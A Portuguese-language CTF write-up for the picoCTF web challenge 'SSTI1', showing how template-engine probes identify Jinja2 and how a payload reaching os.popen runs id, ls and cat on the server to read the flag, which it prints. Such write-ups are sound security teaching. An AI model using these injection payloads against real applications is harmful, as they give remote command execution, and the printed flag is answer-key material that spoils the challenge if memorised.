# SSTI1
#### Solved by @joaoselim
> This CTF is about web, SSTI

## About the challenge
A questão [SSTI1](https://play.picoctf.org/practice/challenge/492) possui o enunciado `I made a cool website where you can announce whatever you want! Try it out!` junto de um link gerado para o site

Simplesmente informa que foi criado um site em que nele se pode anunciar qualquer coisa.

## Solution
Ao abrir o site encontra-se uma página simples com espaço para inserir texto

[![tela-inicial.png](https://i.postimg.cc/Z5QY2rfs/tela-inicial.png)](https://postimg.cc/0zpqJJ17)

Sabendo pelo nome da questão, para chegar na flag tem de trabalhar com [SSTI](https://portswigger.net/web-security/server-side-template-injection#what-is-server-side-template-injection), que consiste em injetar códigos em templates que são analisados pelo lado do servidor.
A primeira etapa é identificar qual o tipo de template com o qual se está lidando, para isso se tem alguns testes.

[![template-decision-tree.png](https://i.postimg.cc/RZBLfH18/template-decision-tree.png)](https://postimg.cc/ykLRCWbX)

Seguindo a ordem de inputs para determinar o tipo de template, inserindo `${7*7}` se tem como saída

[![teste1.png](https://i.postimg.cc/mrM4nK1h/teste1.png)](https://postimg.cc/R3M26sRz)

Não funcionou, não chegou a ser executado, simplesmente foi lido e exibido como texto normal. Próximo payload a ser testado, de acordo com a árvore de decisões, é `{{7*7}}`.

Inserindo temos como saída

[![teste2.png](https://i.postimg.cc/nz4Dndgh/teste2.png)](https://postimg.cc/hzGjr0Kk)

Foi executado, o programa entendeu que deveria realizar a multiplicação de `7 * 7` e exibiu o resultado `49`. Ainda seguindo nos testes de identificação, o próximo payload é `{{7*'7'}}`.

Inserindo se tem como saída

[![teste3.png](https://i.postimg.cc/4x144DNM/teste3.png)](https://postimg.cc/v4cw3SnL)

Com isso se determinou que se trata de um template de tipo Jinja2, pois o payload `{{7*'7'}}` em Twig teria tido como saída `49`.

Agora, sabendo em que se baseia o site, se analisa a construção de [payloads específicos para jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/bd5b09a85b06e28a1e3fca58323b3629738e5543/Server%20Side%20Template%20Injection/Python.md#jinja2). Primeiro ao realizar uma análise dos ids usando
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
Já mostrou que o processo roda como root.

[![input1.png](https://i.postimg.cc/4xwK27tm/input1.png)](https://postimg.cc/9DRFrfLh)

Assim seguindo, tendo em mente que já se está no diretório raiz, o próximo passo é identificar onde está guardada a flag.

Então rodando
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```
Aparecem as informações

[![input2.png](https://i.postimg.cc/j2VCnzVk/input2.png)](https://postimg.cc/LYTmrg8z)

O comando `ls` lê quais arquivos e pastas estão guardados na pasta em que você está.

Então agora se tem conhecimento da existência de um arquivo chamado `flag`. Então o próximo passo é ler o que está escrito dentro dele, para isso ao invés do comando `ls` se usa o `cat` e especifica qual arquivo que se quer ler
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```
[![input3.png](https://i.postimg.cc/v894FSfR/input3.png)](https://postimg.cc/yW110jLn)

Assim chegando na flag:
>'picoCTF{s4rv3r_s1d3_t3mpl4t3_1nj3ct10n5_4r3_c001_9451989d}'
